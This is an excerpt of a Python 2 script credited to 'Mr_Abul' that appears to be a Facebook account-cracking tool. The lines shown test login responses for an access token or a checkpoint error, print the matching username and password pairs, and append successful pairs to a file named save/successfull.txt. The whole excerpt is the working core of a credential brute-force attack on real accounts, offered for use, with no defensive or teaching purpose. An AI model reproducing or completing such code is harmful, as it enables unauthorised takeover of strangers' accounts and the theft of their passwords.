...
print("\033[0;91mThis Tool's By Mr_Abul")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Mr_Abul'
    print '\033[0;94mFACEBOOK : OLidur Rahman'
    print '\033[0;96mINSTA   : aita ami usr kori na_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Mr_Abul-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [Mr_Abul OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
